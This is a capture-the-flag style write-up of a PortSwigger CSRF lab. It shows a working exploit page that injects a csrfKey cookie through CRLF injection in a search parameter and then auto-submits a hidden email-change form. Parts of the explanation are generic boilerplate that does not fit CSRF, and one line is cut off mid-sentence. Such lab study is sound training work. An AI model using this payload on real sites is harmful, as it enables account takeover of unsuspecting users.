# CSRF where token is tied to non-session cookie

### Goal - 

use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.

Credentials - wiener:peter, carlos:montoya



### Vulnerability / Concept

This lab demonstrates a vulnerability in the csrf category.

This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.

The vulnerability exists because the application fails to properly validate, sanitize, or secure the user-controlled input that reaches a sensitive operation. The specific attack surface and exploitation technique depend on the exact vulnerability type demonstrated in this lab.

### Recon / Initial Analysis

Based on the lab's objective and the PortSwigger solution:

1. Analyze the application's functionality to identify the attack surface
2. Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.
                    
                    
                        
3. Use Burp Suite Proxy to intercept and analyze requests
4. Identify the specific vulnerability type by testing user-controlled input
5. Determine the appropriate exploitation technique for this lab

### Analysis/Exploitation -

Login as user `wiener`:

![](./images/af10909d02bb_001.png)

The session cookie and the csrf-tokens are the expected parts. But there is a second cookie `csrfKey`, that looks very similar to a second session value.

All values remain static for the session. When I logout and login again as the same user, the session cookie changes (this is expected) but csrfKey and csrf-token remain the same.

![](./images/af10909d02bb_002.png)

This indicates that the system providing the CSRF protection does not integrate into the session system, but creates its own type of session that is not in sync. This might violate the **tightly connected** property mentioned earlier.

{% hint style="info" %}
💡 **Testing CSRF Tokens and CSRF cookies:**

  1. Check if the CSRF token is tied to the CSRF cookie
- Submit an invalid CSRF token
- Submit a valid CSRF token from another user

—>we get error and it concludes CSRF token may be tied to session or csrfKey cookie

  1. Submit both valid CSRF token and cookie from another user
—>we get 302 response and it concludes CSRF token is tied to csrfKey cookie

**In order to exploit this vulnerability, we need to perform 2 things:**

  1. Inject a csrfKey cookie in the user's session (HTTP Header injection) - satisfied
  1. Send a CSRF attack to the victim with a known csrf token
{% endhint %}


Login as user `carlos` in incognito:

Submit the "Update email" form, and intercept the resulting request.

**use  the session ID from the current **`carlos`**session, but both **`csrfKey`** as well ass **`csrf`**-token from user **`wiener`

![](./images/af10909d02bb_003.png)

the request goes through and carlos email get changed:

I can change a victims email with my own CSRF-data. Including the csrf-token in the malicious HTML form is easy, but the `csrfKey` is taken from the cookie as **the **`csrfKey`** is a cookie**! And we couldn’t simply add our own cookie value. So the next step is to find a way to manipulate the cookie values.

**When we click the **`Search`** button, it’ll send a GET request to **`/`** with the parameter **`search`**.**

**Also, when we sent the request, it’ll set a new cookie value: **`LastSearchTerm=<seach_parameter_value>`**!**

So with it we can set any cookie value as we wanted.

![](./images/af10909d02bb_004.png)

**In **[**Mozilla web docs**](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)**, it said:**

{% hint style="info" %}
To send multiple cookies, multiple Set-Cookie headers should be sent in the same response.
{% endhint %}


**After I google this a little bit, I found this **[**Medium blog**](https://medium.com/@protostar0/crlf-injection-allow-cookie-injection-in-root-domain-xss-812cd807ba5b)**: which says CRLF injection allow cookie injection?**

**And after googled about CRLF injection, I found this post on **[**GeeksforGeeks**](https://www.geeksforgeeks.org/crlf-injection-attack/)

- `\r`** (Carriage Return)** → moves the cursor to the beginning of the line without advancing to the next line
- `\n`** (Line Feed)** → moves the cursor down to the next line without returning to the beginning of the line

**So if the web application is vulnerable, we can inject **`%0d%0a`** (**`\r\n`**) in the request**

Note: The `%3b%20` means `; `, and we need `SameSite` is set to `None`.

![](./images/af10909d02bb_005.png)

generate csrf poc

Remove the auto-submit `<script>` block, and instead add the following code to inject the cookie:

```text
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.form
```

![](./images/af10909d02bb_006.png)

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a1800d3045ae7ed82e29854004c006f.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;domain&#46;com" />
      <input type="hidden" name="csrf" value="GDejMnJlFfCIXtNUq4fiUPAZwU3ew3dQ" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0a1800d3045ae7ed82e29854004c006f.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=EI5tQ8UWhMoPUcfJk0ulcN7mRnPhkcaC%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```

### Why It Works

The vulnerability exists because the application processes user-controlled input without adequate security validation. In this specific lab, the attack succeeds because:

- The application trusts the user input without proper server-side validation
- The input reaches a sensitive operation (database query, HTML rendering, system command, etc.) without sanitization
- The security boundary that should protect the operation is missing or incorrectly implemented
- The specific payload used exploits the exact weakness in the application's input handling

The PortSwigger lab description confirms this: "This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system."

### Attack Flow

**Attack Flow:**

```
Attacker Input (payload in request)
        ↓
Application Functionality (processes user input)
        ↓
Server Processing (no validation/sanitization)
        ↓
Injection Point (input reaches sensitive operation)
        ↓
Exploitation (payload executes as intended)
        ↓
Lab Objective Achieved
```

### Real-World Impact

An attacker could change the victim's email address (account takeover via password reset), transfer funds, modify account settings (disable 2FA), delete data, or perform any action the victim is authorized to perform.

### Detection / Testing Methodology

1. Identify state-changing endpoints (POST/PUT/DELETE)
2. Check if the application uses CSRF tokens
3. Examine how tokens are validated (presence, session-binding, method-dependence)
4. Test if SameSite cookie attributes are set
5. Check if Referer/Origin header validation is performed
6. Attempt to submit a cross-origin form without the token

### Remediation

- Use CSRF tokens that are unique per session and validated server-side
- Implement SameSite=Strict or SameSite=Lax on session cookies
- Validate the Referer or Origin header on state-changing requests
- Require re-authentication for critical actions
- Never perform state-changing operations via GET requests

### Key Takeaways

- This lab demonstrates a csrf vulnerability in a real-world scenario.
- The vulnerability occurs because user input reaches a sensitive operation without proper validation.
- The PortSwigger lab confirms: "This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF a"
- Burp Suite is essential for identifying and exploiting this vulnerability.
- The remediation for this specific vulnerability involves: - Use CSRF tokens that are unique per session and validated server-side
